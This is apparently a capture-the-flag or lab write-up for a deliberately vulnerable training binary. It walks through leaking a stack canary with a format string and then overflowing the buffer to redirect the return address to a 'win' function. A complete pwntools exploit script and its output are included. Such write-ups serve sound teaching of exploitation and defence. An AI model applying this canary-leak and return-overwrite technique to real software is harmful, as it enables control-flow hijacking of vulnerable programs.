# 05_ret_overwrite_canary_leak Writeup

## Steps:
1. Run chall. Notice this is similar to 04 except the canary is not provided. We will need to use a Format String to `leak` the value.
```
$ ./chall 

Your goal is to modify the return pointer @ 0x7fff1baf2018, to a function called 'win' in the binary.

This program has a canary @ 0x7fff1baf2008. This time, you must determine it's value yourself, via a leak.
Lucky for you, there is now a format string vulnerabiltiy for you to leverage!

0x7fff1baf1ff0: 0x0000000000000000 0x0000000000000000 
0x7fff1baf2000: 0x0000000000000000 *****REDACTED*****
0x7fff1baf2010: 0x0000000000000001 0x00007f66fbfbfca8 

Enter your name: AAAA
Hello, AAAA. Good luck!

Enter input: AAAA

0x7fff1baf1ff0: 0x0000000a41414141 0x0000000000000000 
0x7fff1baf2000: 0x0000000000000000 *****REDACTED*****
0x7fff1baf2010: 0x0000000000000001 0x00007f66fbfbfca8 

You failed to overwrite the return pointer and canary.
```
2. Using gdb gef, `disas main` to determine where to set breakpoints. Break before `scanf` and view the stack with `x/40gx $rsp`.
3. Type `canary` for gef to print the canary value and location. Identify how far into the stack the `canary` is and add 5.
4. Create the format string that will `leak` the canary value with `%__$p`. This will be the first payload.
5. Recieve the `canary` from the line printing it
6.  Create the payload, same as for 04
- 24 bytes of garbage to reach `canary`
- value of `canary`
- 8 bytes of garbage to reach return pointer
- address of `win`
```
from pwn import *

target = process("./chall")

target.sendline(b"%11$p")

var = target.recvuntil(b"Hello, 0x")
canary = target.recvuntil(b".")[:-1].strip().decode()
print("Canary is", canary)
canary = int(canary,16)

win = 0x00401606

payload = b"A"*24
payload += p64(canary)
payload += b"B"*8
payload += p64(win)

target.sendline(payload)

s = target.recvall().decode()
print(s)
```

## Solution:
```
$ python3 exploit.py
[+] Starting local process './chall': pid 54735
Canary is 7f9751dffb596c00
[+] Receiving all data: Done (312B)
[*] Process './chall' stopped with exit code 0 (pid 54735)
 Good luck!

Enter input: 
0x7ffd24144980: 0x4141414141414141 0x4141414141414141 
0x7ffd24144990: 0x4141414141414141 *****REDACTED*****
0x7ffd241449a0: 0x4242424242424242 0x0000000000401606 

Congrats, you successuly changed execution flow!
```
